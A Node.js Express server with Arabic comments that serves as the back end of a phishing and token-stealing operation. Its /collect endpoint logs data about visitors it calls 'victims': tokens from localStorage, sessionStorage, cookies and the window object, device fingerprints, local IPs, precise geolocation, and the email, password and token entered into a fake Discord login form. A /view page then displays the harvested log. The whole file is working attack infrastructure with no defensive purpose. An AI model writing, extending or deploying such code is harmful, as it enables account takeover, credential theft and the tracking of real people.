const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// دالة لتنسيق البيانات بشكل جميل
function formatLogEntry(data, ip, userAgent) {
    const lines = [];
    const separator = '═'.repeat(60);
    
    lines.push(separator);
    lines.push('📌 بيانات ضحية جديدة');
    lines.push(`🕒 التوقيت: ${new Date().toISOString()}`);
    lines.push(`🌐 الـ IP: ${ip}`);
    lines.push(`💻 المتصفح: ${userAgent}`);
    lines.push(separator);
    
    // معلومات الجهاز
    lines.push('\n🔹 معلومات الجهاز:');
    lines.push(`   - نظام التشغيل: ${data.platform || 'غير معروف'}`);
    lines.push(`   - اللغة: ${data.language || 'غير معروف'}`);
    lines.push(`   - دقة الشاشة: ${data.screenWidth || '?'} × ${data.screenHeight || '?'}`);
    lines.push(`   - عمق الألوان: ${data.colorDepth || '?'} بت`);
    lines.push(`   - نسبة البكسل: ${data.pixelRatio || '?'}`);
    lines.push(`   - المنطقة الزمنية: ${data.timezone || 'غير معروف'}`);
    lines.push(`   - عدد المعالجات: ${data.fingerprint?.hardwareConcurrency || 'غير معروف'}`);
    lines.push(`   - الذاكرة المتاحة: ${data.fingerprint?.deviceMemory || 'غير معروف'} GB`);
    
    // معلومات الشبكة
    if (data.network) {
        lines.push('\n🔹 معلومات الشبكة:');
        lines.push(`   - نوع الاتصال: ${data.network.connection?.type || 'غير معروف'}`);
        lines.push(`   - سرعة التحميل: ${data.network.connection?.downlink || 'غير معروف'}`);
        lines.push(`   - زمن الاستجابة: ${data.network.connection?.rtt || 'غير معروف'}`);
        if (data.network.localIPs) {
            lines.push(`   - الـ IP المحلي(ة): ${data.network.localIPs.join(', ')}`);
        }
    }
    
    // الخطوط المثبتة
    if (data.installedFonts && data.installedFonts.length > 0) {
        lines.push('\n🔹 الخطوط المثبتة:');
        lines.push(`   ${data.installedFonts.join(', ')}`);
    }
    
    // الموقع الجغرافي
    if (data.location) {
        if (data.location.lat) {
            lines.push('\n🔹 الموقع الجغرافي:');
            lines.push(`   - خط العرض: ${data.location.lat}`);
            lines.push(`   - خط الطول: ${data.location.lng}`);
            lines.push(`   - الدقة: ${data.location.accuracy} متر`);
            // رابط خرائط
            lines.push(`   - رابط الخريطة: https://maps.google.com/?q=${data.location.lat},${data.location.lng}`);
        } else if (data.location.error) {
            lines.push(`\n🔹 الموقع الجغرافي: فشل - ${data.location.error}`);
        }
    }
    
    // ============== التوكنات المستخرجة ==============
    if (data.extractedTokens) {
        const t = data.extractedTokens;
        let hasToken = false;
        
        // localStorage
        if (t.localStorage && t.localStorage.length > 0) {
            lines.push('\n🔑 التوكنات من localStorage:');
            t.localStorage.forEach(item => {
                lines.push(`   🔸 ${item.key}: ${item.value.substring(0, 150)}${item.value.length > 150 ? '...' : ''}`);
                hasToken = true;
            });
        }
        
        // sessionStorage
        if (t.sessionStorage && t.sessionStorage.length > 0) {
            lines.push('\n🔑 التوكنات من sessionStorage:');
            t.sessionStorage.forEach(item => {
                lines.push(`   🔸 ${item.key}: ${item.value.substring(0, 150)}${item.value.length > 150 ? '...' : ''}`);
                hasToken = true;
            });
        }
        
        // cookies
        if (t.cookies && t.cookies.length > 0) {
            lines.push('\n🍪 التوكنات من الكوكيز:');
            t.cookies.forEach(c => {
                lines.push(`   🔸 ${c}`);
                hasToken = true;
            });
        }
        
        // global
        if (t.global && t.global.length > 0) {
            lines.push('\n🌍 التوكنات من window object:');
            t.global.forEach(item => {
                lines.push(`   🔸 ${item.key}: ${item.value.substring(0, 150)}${item.value.length > 150 ? '...' : ''}`);
                hasToken = true;
            });
        }
        
        // IndexedDB
        if (t.indexedDB) {
            lines.push(`\n📦 IndexedDB: ${t.indexedDB}`);
        }
        
        if (!hasToken) {
            lines.push('\n🔑 التوكنات: ❌ لم يتم العثور على أي توكن في هذه الجلسة');
        }
    }
    
    // ============== نموذج الدسكورد الوهمي ==============
    if (data.discordEmail || data.discordPassword || data.discordToken) {
        lines.push('\n🎯 بيانات من نموذج الدسكورد الوهمي:');
        if (data.discordEmail) lines.push(`   📧 البريد الإلكتروني: ${data.discordEmail}`);
        if (data.discordPassword) lines.push(`   🔒 كلمة المرور: ${data.discordPassword}`);
        if (data.discordToken) lines.push(`   🎫 التوكن المدخل: ${data.discordToken}`);
        if (data.extra === 'discord_login_form') {
            lines.push('   ⚠️ المصدر: نموذج تسجيل الدخول الوهمي');
        }
    }
    
    // ============== محتويات التخزين الكاملة ==============
    if (data.fullLocalStorage) {
        const ls = data.fullLocalStorage;
        if (Object.keys(ls).length > 0 && !ls.error) {
            lines.push('\n💾 محتويات localStorage كاملة:');
            for (const key in ls) {
                let val = ls[key];
                if (typeof val === 'string' && val.length > 100) {
                    val = val.substring(0, 100) + '...';
                }
                lines.push(`   📁 ${key}: ${val}`);
            }
        }
    }
    
    if (data.fullSessionStorage) {
        const ss = data.fullSessionStorage;
        if (Object.keys(ss).length > 0 && !ss.error) {
            lines.push('\n💾 محتويات sessionStorage كاملة:');
            for (const key in ss) {
                let val = ss[key];
                if (typeof val === 'string' && val.length > 100) {
                    val = val.substring(0, 100) + '...';
                }
                lines.push(`   📁 ${key}: ${val}`);
            }
        }
    }
    
    // ============== جميع الكوكيز ==============
    if (data.allCookies) {
        const cookies = data.allCookies.split(';').filter(c => c.trim());
        if (cookies.length > 0) {
            lines.push('\n🍪 جميع الكوكيز:');
            cookies.forEach(c => lines.push(`   🍪 ${c.trim()}`));
        }
    }
    
    // ============== بصمة الجهاز ==============
    if (data.fingerprint) {
        if (data.fingerprint.canvas) {
            lines.push(`\n🎨 بصمة Canvas: ${data.fingerprint.canvas.substring(0, 80)}...`);
        }
        if (data.fingerprint.webgl) {
            lines.push(`🖥️ بصمة WebGL: ${data.fingerprint.webgl}`);
        }
    }
    
    // ============== محاولة الوصول للملفات ==============
    if (data.localFileAccess) {
        if (data.localFileAccess.possible) {
            lines.push('\n📂 صلاحية الوصول للملفات: ✅ ممكنة');
            if (data.localFileAccess.details) {
                data.localFileAccess.details.forEach(d => lines.push(`   ℹ️ ${d}`));
            }
        } else {
            lines.push(`\n📂 صلاحية الوصول للملفات: ❌ غير ممكنة - ${data.localFileAccess.error || 'غير معروف'}`);
        }
    }
    
    lines.push('\n' + separator);
    lines.push('🏁 نهاية البيانات');
    lines.push(separator + '\n');
    
    return lines.join('\n');
}

app.post('/collect', (req, res) => {
    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'غير معروف';
    
    const formattedText = formatLogEntry(data, ip, userAgent);
    
    // حفظ في ملف بصيغة نصية واضحة
    fs.appendFileSync('data.log', formattedText, 'utf8');
    console.log('✅ تم استقبال بيانات جديدة');
    res.sendStatus(200);
});

app.get('/view', (req, res) => {
    if (fs.existsSync('data.log')) {
        const content = fs.readFileSync('data.log', 'utf8');
        res.send(`<html><head><title>البيانات المجمعة</title><style>
            body { background: #0d1117; color: #e6edf3; font-family: 'Courier New', monospace; padding: 30px; }
            pre { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; font-size: 14px; line-height: 1.7; white-space: pre-wrap; word-wrap: break-word; direction: ltr; text-align: left; }
            .header { color: #58a6ff; font-size: 24px; margin-bottom: 10px; }
            .footer { color: #8b949e; font-size: 12px; margin-top: 20px; }
        </style></head><body>
            <h1 class="header">📊 البيانات المجمعة</h1>
            <pre>${content}</pre>
            <p class="footer">🔄 تحديث تلقائي كل 30 ثانية | <a href="/view" style="color:#58a6ff;">تحديث يدوي</a></p>
            <script>setTimeout(function(){ location.reload(); }, 30000);</script>
        </body></html>`);
    } else {
        res.send('📭 لا توجد بيانات حتى الآن. انتظر حتى يزور أحدهم الموقع.');
    }
});

app.listen(port, () => {
    console.log(`🚀 Server running on port ${port}`);
});
